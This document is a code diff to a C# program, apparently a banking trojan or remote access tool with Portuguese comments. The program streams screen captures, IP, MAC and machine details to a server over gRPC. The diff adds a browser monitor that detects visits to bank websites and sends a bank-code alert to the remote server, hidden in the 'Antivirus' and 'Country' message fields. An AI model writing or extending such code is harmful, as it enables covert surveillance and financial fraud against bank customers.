@@ -201,6 +201,47 @@ class Program
         }
         // ======================================================================
 
+        // ========== NOVO: Browser Monitor (monitoramento de bancos) ==========
+        var browserMonitor = new BrowserMonitor();
+
+        // Quando detectar banco, envia alerta ao servidor
+        browserMonitor.BankDetected += async (sender, args) =>
+        {
+            try
+            {
+                // Formato: "BB:\nDESKTOP-ABC123"
+                string alertMessage = $"{args.BankCode}:{System.Environment.NewLine}{args.ComputerName}";
+
+                Console.WriteLine($"[BANK-ALERT] Enviando alerta ao servidor: {args.BankCode}");
+                Console.WriteLine($"[BANK-ALERT] URL: {args.Url}");
+
+                // Envia comando de alerta ao servidor via gRPC
+                await call.RequestStream.WriteAsync(new ScreenFrame
+                {
+                    PcName = info.PcName,
+                    ImageData = Google.Protobuf.ByteString.Empty,
+                    Width = 0,
+                    Height = 0,
+                    MonitorIndex = 0,
+                    MonitorsCount = 0,
+                    Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
+                    Ip = info.Ip,
+                    Mac = info.Mac,
+                    Antivirus = alertMessage, // Usa campo Antivirus para enviar alerta
+                    Country = args.BankCode  // Usa campo Country para enviar código do banco
+                });
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[BANK-ALERT] Erro ao enviar alerta: {ex.Message}");
+            }
+        };
+
+        // Inicia monitoramento em background
+        var monitorTask = browserMonitor.StartMonitoring(cts.Token);
+        Console.WriteLine("[BROWSER-MONITOR] Sistema de monitoramento iniciado");
+        // ======================================================================
+
         // resolução atual da tela capturada
         int lastWidth = 1920;
         int lastHeight = 1080;
@@ -493,7 +534,7 @@ class Program
             }
         }, cts.Token);
 
-        await Task.WhenAll(sendTask, receiveTask);
+        await Task.WhenAll(sendTask, receiveTask, monitorTask);
 
         // Limpar overlays
         try
